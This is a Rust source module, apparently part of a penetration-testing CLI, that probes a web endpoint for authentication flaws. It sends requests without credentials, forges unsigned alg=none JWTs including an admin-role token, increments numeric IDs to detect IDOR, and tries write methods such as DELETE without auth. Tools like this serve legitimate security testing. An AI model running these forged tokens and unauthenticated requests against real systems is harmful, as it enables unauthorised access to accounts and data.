use base64::{Engine, engine::general_purpose::URL_SAFE_NO_PAD};
use colored::Colorize;
use std::time::Duration;
use tokio::time::sleep;

use super::client::build_client;

pub async fn auth(
    target_url: &str,
    token: Option<&str>,
    idor: bool,
    no_auth: bool,
    jwt_none: bool,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} Auth Bypass Testing", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), target_url.green());
    println!("{}", "─".repeat(60).dimmed());

    let mut findings = Vec::new();

    // 1. Baseline with valid token (if provided)
    let baseline = if let Some(t) = token {
        println!(
            "\n{} Establishing baseline with valid token...",
            "[*]".cyan().bold()
        );
        let client = build_client(timeout, Some(t), None, None)?;
        match client.get(target_url).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let body = r.text().await.unwrap_or_default();
                let len = body.len();
                println!(
                    "{} Baseline: HTTP {} ({} bytes)",
                    "[*]".cyan().bold(),
                    status,
                    len
                );
                Some(BaselineResponse {
                    status,
                    len,
                    body_hash: simple_hash(&body),
                })
            }
            Err(e) => {
                println!("{} Baseline request failed: {}", "[-]".red().bold(), e);
                None
            }
        }
    } else {
        None
    };

    // 2. Test without auth headers
    if no_auth || token.is_some() {
        println!("\n{} Testing without auth headers...", "[*]".cyan().bold());
        let client = build_client(timeout, None, None, None)?;
        match client.get(target_url).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let body = r.text().await.unwrap_or_default();
                let len = body.len();

                let bypassed = match &baseline {
                    Some(b) => status == b.status && len.abs_diff(b.len) < 50,
                    None => status == 200,
                };

                if bypassed {
                    println!(
                        "{} AUTH BYPASS: endpoint accessible without auth! (HTTP {}, {} bytes)",
                        "[!]".red().bold().blink(),
                        status,
                        len
                    );
                    findings.push(AuthFinding {
                        test: "No auth headers".to_string(),
                        status,
                        result: "BYPASS — endpoint accessible without authentication".to_string(),
                        severity: "CRITICAL".to_string(),
                    });
                } else {
                    println!(
                        "{} No auth: HTTP {} ({} bytes) — properly rejected",
                        "[-]".dimmed(),
                        status,
                        len
                    );
                }
            }
            Err(e) => println!("{} Request failed: {}", "[-]".red().bold(), e),
        }
    }

    // 3. JWT alg=none bypass
    if jwt_none || token.is_some() {
        println!("\n{} Testing JWT alg=none bypass...", "[*]".cyan().bold());

        if let Some(t) = token {
            // Decode the existing JWT to get the payload
            let parts: Vec<&str> = t.split('.').collect();
            if parts.len() >= 2 {
                let payload_bytes = URL_SAFE_NO_PAD.decode(parts[1]).unwrap_or_default();
                let _payload_str = String::from_utf8_lossy(&payload_bytes);

                // Create alg=none header
                let none_header = r#"{"alg":"none","typ":"JWT"}"#;
                let header_b64 = URL_SAFE_NO_PAD.encode(none_header);
                // Keep original payload, empty signature
                let forged = format!("{}.{}.", header_b64, parts[1]);

                let client = build_client(timeout, Some(&forged), None, None)?;
                match client.get(target_url).send().await {
                    Ok(r) => {
                        let status = r.status().as_u16();
                        let body = r.text().await.unwrap_or_default();
                        let len = body.len();

                        let bypassed = match &baseline {
                            Some(b) => status == b.status && len.abs_diff(b.len) < 50,
                            None => status == 200,
                        };

                        if bypassed {
                            println!(
                                "{} JWT alg=none BYPASS: server accepted unsigned token! (HTTP {})",
                                "[!]".red().bold().blink(),
                                status
                            );
                            findings.push(AuthFinding {
                                test: "JWT alg=none".to_string(),
                                status,
                                result: "BYPASS — server accepted alg=none token".to_string(),
                                severity: "CRITICAL".to_string(),
                            });
                        } else {
                            println!(
                                "{} JWT alg=none: HTTP {} — properly rejected",
                                "[-]".dimmed(),
                                status
                            );
                        }
                    }
                    Err(e) => println!("{} Request failed: {}", "[-]".red().bold(), e),
                }
            } else {
                println!("{} Provided token is not a valid JWT", "[-]".red().bold());
            }
        } else {
            // No token provided, craft a generic alg=none JWT
            let none_header = URL_SAFE_NO_PAD.encode(r#"{"alg":"none","typ":"JWT"}"#);
            let none_payload = URL_SAFE_NO_PAD.encode(r#"{"sub":"admin","role":"admin"}"#);
            let forged = format!("{}.{}.", none_header, none_payload);

            let client = build_client(timeout, Some(&forged), None, None)?;
            match client.get(target_url).send().await {
                Ok(r) => {
                    let status = r.status().as_u16();
                    if status == 200 {
                        println!(
                            "{} JWT alg=none BYPASS: server accepted unsigned token! (HTTP {})",
                            "[!]".red().bold().blink(),
                            status
                        );
                        findings.push(AuthFinding {
                            test: "JWT alg=none".to_string(),
                            status,
                            result: "BYPASS — server accepted alg=none token".to_string(),
                            severity: "CRITICAL".to_string(),
                        });
                    } else {
                        println!(
                            "{} JWT alg=none: HTTP {} — rejected",
                            "[-]".dimmed(),
                            status
                        );
                    }
                }
                Err(e) => println!("{} Request failed: {}", "[-]".red().bold(), e),
            }
        }
    }

    // 4. IDOR testing
    if idor {
        println!(
            "\n{} Testing IDOR (Insecure Direct Object Reference)...",
            "[*]".cyan().bold()
        );

        // Find numeric IDs in the URL and try incrementing/decrementing
        let ids = extract_numeric_ids(target_url);

        if ids.is_empty() {
            println!(
                "{} No numeric IDs found in URL. Try: http://target.com/api/users/123",
                "[-]".yellow().bold()
            );
        } else {
            for (placeholder, original_id) in &ids {
                println!("{} Found ID: {} in URL", "[*]".cyan().bold(), original_id);

                // Get baseline for original ID
                let client = build_client(timeout, token, None, None)?;
                let baseline_resp = client.get(target_url).send().await;
                let baseline_data = match baseline_resp {
                    Ok(r) => {
                        let s = r.status().as_u16();
                        let b = r.text().await.unwrap_or_default();
                        Some((s, b.len(), simple_hash(&b)))
                    }
                    Err(_) => None,
                };

                // Try ID+1 and ID-1
                for delta in &[1i64, -1, 2, -2, 100, -100] {
                    let new_id = (*original_id as i64 + delta) as u64;
                    let test_url = target_url.replace(placeholder, &new_id.to_string());

                    if let Ok(r) = client.get(&test_url).send().await {
                        let status = r.status().as_u16();
                        let body = r.text().await.unwrap_or_default();
                        let len = body.len();

                        let same_as_baseline = baseline_data
                            .as_ref()
                            .map(|(s, l, _h)| status == *s && len.abs_diff(*l) < 50)
                            .unwrap_or(false);

                        let is_200 = status == 200;

                        if is_200 && (same_as_baseline || delta.abs() > 1) {
                            let severity = if same_as_baseline { "HIGH" } else { "MEDIUM" };
                            println!(
                                "{} IDOR: ID {} -> {} returned HTTP {} ({} bytes) — {}",
                                "[!]".yellow().bold(),
                                original_id,
                                new_id,
                                status,
                                len,
                                if same_as_baseline {
                                    "same as original!"
                                } else {
                                    "accessible"
                                },
                            );
                            findings.push(AuthFinding {
                                test: format!("IDOR: {} -> {}", original_id, new_id),
                                status,
                                result: format!("ID {} accessible (delta: {})", new_id, delta),
                                severity: severity.to_string(),
                            });
                        }
                    }

                    sleep(Duration::from_millis(100)).await;
                }
            }
        }
    }

    // 5. HTTP method confusion
    if token.is_some() {
        println!("\n{} Testing HTTP method confusion...", "[*]".cyan().bold());
        let client = build_client(timeout, None, None, None)?;

        for method in &["POST", "PUT", "PATCH", "DELETE"] {
            let req = match *method {
                "POST" => client.post(target_url),
                "PUT" => client.put(target_url),
                "PATCH" => client.patch(target_url),
                "DELETE" => client.delete(target_url),
                _ => continue,
            };

            if let Ok(r) = req.send().await {
                let status = r.status().as_u16();
                if status != 401 && status != 403 && status != 405 {
                    println!(
                        "{} Method {} without auth: HTTP {} — not properly protected!",
                        "[!]".yellow().bold(),
                        method,
                        status
                    );
                    findings.push(AuthFinding {
                        test: format!("Method {} no auth", method),
                        status,
                        result: format!("{} without auth returned {}", method, status),
                        severity: "MEDIUM".to_string(),
                    });
                }
            }
        }
    }

    // Summary
    println!("\n{}", "═".repeat(60).cyan());
    println!("{} Auth bypass testing complete", "[*]".cyan().bold());
    println!("{} Findings: {}", "[*]".cyan().bold(), findings.len());

    if !findings.is_empty() {
        println!("\n{} Vulnerabilities found:", "[!]".red().bold());
        println!("{}", "─".repeat(60).dimmed());

        for f in &findings {
            let sev = match f.severity.as_str() {
                "CRITICAL" => f.severity.red().bold().blink(),
                "HIGH" => f.severity.red().bold(),
                "MEDIUM" => f.severity.yellow().bold(),
                _ => f.severity.cyan(),
            };
            println!("  {} [{}] {}", "•".cyan(), sev, f.test.white().bold());
            println!(
                "    {} HTTP {} — {}",
                "Result:".dimmed(),
                f.status,
                f.result
            );
        }
    } else {
        println!("{} No auth bypass vulnerabilities found.", "[-]".dimmed());
    }

    Ok(())
}

struct BaselineResponse {
    status: u16,
    len: usize,
    body_hash: u64,
}

struct AuthFinding {
    test: String,
    status: u16,
    result: String,
    severity: String,
}

fn extract_numeric_ids(url: &str) -> Vec<(String, u64)> {
    let mut ids = Vec::new();

    // Find numeric segments in the URL path
    // e.g. /api/users/123 -> ("123", 123)
    let parts: Vec<&str> = url.split('/').collect();
    for part in parts {
        if let Ok(id) = part.parse::<u64>() {
            // Store the original string and parsed value
            ids.push((part.to_string(), id));
        }
    }

    ids
}

fn simple_hash(s: &str) -> u64 {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut hasher = DefaultHasher::new();
    s.hash(&mut hasher);
    hasher.finish()
}
